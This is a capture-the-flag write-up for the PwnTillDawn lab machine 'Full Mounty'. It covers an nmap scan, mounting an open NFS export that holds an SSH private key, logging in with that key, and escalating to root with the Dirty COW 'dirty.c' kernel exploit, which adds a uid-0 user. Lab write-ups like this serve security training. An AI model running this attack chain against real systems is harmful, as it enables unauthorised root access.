---
title: Full Mounty
categories: [writeups,PwnTillDawn]
tags: [Linux,Privilege-Escalation,SSH,Linux-Kernel-Exploit]
---
# Full Mounty
- Difficulty : `easy`
- IP Address : `10.150.150.134`
- Operating System : `Linux`

# Table of Content
- [Nmap Result](#nmap-result)
- [Method to solve the challenge](#method-to-solve-the-challenge)
- [Privilege Escalation](#privilege-escalation)

## Nmap Result
```
Nmap scan report for 10.150.150.134
Host is up, received conn-refused (0.26s latency).
Scanned at 2022-07-20 04:34:06 UTC for 42s

PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 5.3p1 Debian 3ubuntu7.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 f6:e9:3f:cf:88:ec:7c:35:63:91:34:aa:14:55:49:cc (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJeSzHxs9effBDGXOO7YKNL6qFLAq08KPqP6W3U2PUc5itfhFwHQF5Fkm1rh+1eJtkIsQwcnep948JwR2ERdadr2UjUVbHsQyVUCoYu60uvhecX5d/2xJH7w2rICOWrFgfspVU7/gAdytXZYt6+9gTrpUFAsrzRl8SYk8oyIzp27AAAAFQD7JzAjZAXbYO2teX/xRRFo+suWjQAAAIBJouPtQlnvPpk5jeTkEph+7tb6XlVeOcRJWqlk0qA4LmDA6nDkgQeQYXtj2tuCHs35SGvgJAPf5YCzgQSEJfkStIwFNnEjoLcDmcyFusH48LhBprHyupdPHJ2oIZiGzJ5gRcO6MBIrD515lBUU0mM4d/EDUc5cgK04ju/KOU8vBgAAAIB5Ibff0Vn6m4qW4UuHR5DJXNJK1qULPOuh0F+aM2Us6k2jyVjvKpgHdrFT9htJuPJYKXWzqPLAiuKphxsUIIPQjd6oBc0NLIXlPwCIMg3uAaEDj4F5EmdbtXDKP8TOtsdOrLErBVVI6Lqhj/dF05jgxgs8z/AR+cGMJfo0q3GakQ==
|   2048 20:1d:e9:90:6f:4b:82:a3:71:1e:a9:99:95:7f:31:ea (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA1vYqn6ShiWsNsD7dqHVGkVcbMl0uKwtjvQRMemx8yVWSkMel3bVKOsAJx+nGDK+9u1ZnhRU3m0t8FlaSPy5Z31BayoNU4U8QxnFsbgnPaYoGqXr9oIhRyoDagXJ/rl6NeAmErwaRcRwFXCSbSVzG1OOYt3fLL8qIklM8Lcbeo8lsJh97AWKfUj1z349v4nGnaBkFG6C4rFlefLvuV+tbq7oyq4Ucce2xDOXiPpRfpKpiLOepzQlJ4kkiYZOhwMiA+3hOm2ZnAOXHsFwb+kYBvcL0sdkLHJ79e8XH/HhugLQQu/07mYEdbgIJN+fxSgFCCkfBE6QBBXBpnyYBNUEK9Q==
111/tcp   open  rpcbind  syn-ack 2 (RPC #100000)
2049/tcp  open  nfs      syn-ack 2-4 (RPC #100003)
8089/tcp  open  ssl/http syn-ack Splunkd httpd
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/localityName=San Francisco/emailAddress=support@splunk.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-10-28T09:51:59
| Not valid after:  2022-10-27T09:51:59
| MD5:   20eb ae2c fb50 a924 c9a2 d40a 3d7e 4f75
| SHA-1: 1878 ed48 2c88 eecb 2d1e 4fa1 4943 adf7 6c2b 6e8f
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQCgzG4Amh8JpzANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0xOTEwMjgwOTUxNTlaFw0yMjEwMjcwOTUx
| NTlaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7AwJ
| uvzYchn28KK3iM+KTHHuNKXGifc4qUdtYvY+eQnxQ9AzQhArZCRa5xDrCQOIpWP5
| DizdbYtDjwJCTGm577cDBmXlhww3+/aQHWZX1Fj5BQpkJ4XB+kumB0JT/8hBQHcG
| qEYDVt28sss4EB5F91iGfMvQD70pFRjKpMupx52qIkvHgWi0Iqb4CleVwuQm6LK/
| Ih0kASnpghYuejiO4xKrJq4SV7Sqpwv2gubxKPNsKRtYOldC4pFPBLiCD8ibg0yl
| jdm6nNqfQ4sSv5I12hFxWjc0ccRXXmO6PL2iXjZKV32xBSlJ85PY79oLzfSp3n/j
| iwLxoBS1lpgnE3rbcwIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQCJ1QaDW8Xci06F
| 4MdpRZXTHrgpWKiOxnos/2FtJIcm2gTI20tMRz/eM5pxcMYhtY6OQFRYXiOhFeZY
| hp2LtOI8s/gyh+CFv14RdUvzxTeos7MpnN95ftAS46+T4q+4FozO/ncAy/0d7RkM
| OUGBtPv2JjKPlPqggFtGHkht9DWzdxWRlV+f4cPD3W4FKHel5tqj8iBU2gGbdyBW
| vw5yw9eyQocrS8YKpFJoRCq6tpAF3J2a8Ayn2Bku0rX+NAAb+HCIb4OAOm9R1KQE
| HzDj/LZjpAVRtyNXk41JGvxXxI7kfz24omBeq40XjlnF/NyDdcoPhNDu50TVwdJx
| 3QWroBqa
|_-----END CERTIFICATE-----
34154/tcp open  mountd   syn-ack 1-3 (RPC #100005)
40110/tcp open  status   syn-ack 1 (RPC #100024)
45783/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Method to solve the challenge
In this challenge, we will starting off with port 2049 also known as nfs. This is a port which share specific directory to other machine. We could check if there is any shared directory by using `showmount -e`. Click [here](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting) for more information.

```
showmount -e 10.150.150.134
Export list for 10.150.150.134:
/srv/exportnfs 10.0.0.0/8
```

Based on the result, anyone with ip address within 10.0.0/8 is allow to connect `/srv/exportnfs`. Since our vpn is within the ip address, we could try to connect with it by using `mount`.

```
mount -v -o vers=3 10.150.150.134:/srv/exportnfs /mnt/exportnfs


-v = verbose
-o = version 
```

After mounted successfully, we could look into the mounted directory and look for information.
<br>
![](/assets/img/posts/2022-07-20-Full-Mounty-1.png)
<br>
The directory gave us our first flag as well as a `id_rsa` and `id_rsa.pub` file. `id_rsa` is useful for us as this file allow us to connect their ssh shell without having the need of their password. `id_rsa.pub` also gave us the username to connect their ssh shell.

```
cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAucbPtwj/Ot2rkrMxBSo63gnu8cUE2NboLy226zUjXwdeSLsh9WPfON/atMJCg/uMcvlpo598E/qUsAJq3TTJTYbdMkVSH3ArxUI0gN9rNVeOOs+MBFqfXYhfyLCFv+wtKyYDMeOxTE63hhEdbKVcGLCW8qhp6yORE7CcDnXqcCP5mJHlKdUqC9VBiYzcOzcKqSh6eCpfraKGsXqOcVvHVMgK8TB/JEHxkIZY2nxEl1WC62LKctEx0ZV7KTgJHhpWy1wyiPir4FOSPWUvUZDGv15B3D/M6UCRIguFllFerAacFVPW7SmKdtV3p4+HY3H1clAsWoLJiV1DRiBxoqZgEQ== 
deadbeef@ubuntu

ssh -i id_rsa -oHostKeyAlgorithms=ssh-rsa -oPubkeyAcceptedKeyTypes=ssh-rsa deadbeef@10.150.150.134

Linux FullMounty 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
Ubuntu 10.04.4 LTS

Welcome to Ubuntu!
 * Documentation:  https://help.ubuntu.com/
New release 'precise' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Aug 12 00:50:59 2020
deadbeef@FullMounty:~$ 
```

# Privilege Escalation
Although we manage to get a shell via ssh, we are not root account and we will need to perform privilege escalation. The most simple way is always use `Linpeas.sh` as it is a automated tool to check methods to get root account. In this case, Linux kernel is our best bet to get root account as it is old and there are a few exploit for it.
```
uname -a
Linux FullMounty 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
```
Although there are a few exploit available, i will be using `dirty.c` exploit. To perform this exploit, we will have to compile the file within the machine in order to make the exploit successful.
```
deadbeef@FullMounty:~$ gcc
The program 'gcc' can be found in the following packages:
 * gcc
 * pentium-builder
Try: sudo apt-get install <selected package>
```
Since this machine does not have `gcc` to compile the file, we will have to get a machine that have the same Linux kernel version and compile it then send it to the victim machine.
<br>
![](/assets/img/posts/2022-07-20-Full-Mounty-2.png)
<br>
![](/assets/img/posts/2022-07-20-Full-Mounty-3.png)
<br>
After that, let the exploit executable and run the file.
<br>
![](/assets/img/posts/2022-07-20-Full-Mounty-4.png)
<br>
After running the file, it will ask for new password. After typing the new password, `/etc/passwd` file will be changed and added a user named `firefart` and the password is based on the input given.
<br>
![](/assets/img/posts/2022-07-20-Full-Mounty-5.png)
<br>
Although the username is still firefart, we manage to get root account as the uid is 0.



